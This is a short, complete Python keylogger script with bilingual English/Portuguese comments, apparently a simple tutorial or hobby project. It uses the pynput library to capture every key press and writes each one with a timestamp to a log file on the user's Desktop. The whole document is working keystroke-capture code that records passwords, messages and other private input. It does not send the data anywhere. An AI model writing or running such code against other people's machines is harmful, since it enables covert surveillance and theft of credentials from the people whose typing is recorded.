from pynput.keyboard import Listener

import os
import logging

username = os.getlogin()
# Where log file is stored: // Onde o arquivo de log é guardado:
logging_directory = f"/home/{username}/Desktop"  # If in windows use "C:/..." // No windows usar "C:/.."

logging.basicConfig(filename=f"{logging_directory}/mylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")


def key_handler(key):
    logging.info(key)


with Listener(on_press=key_handler) as listener:
    listener.join()
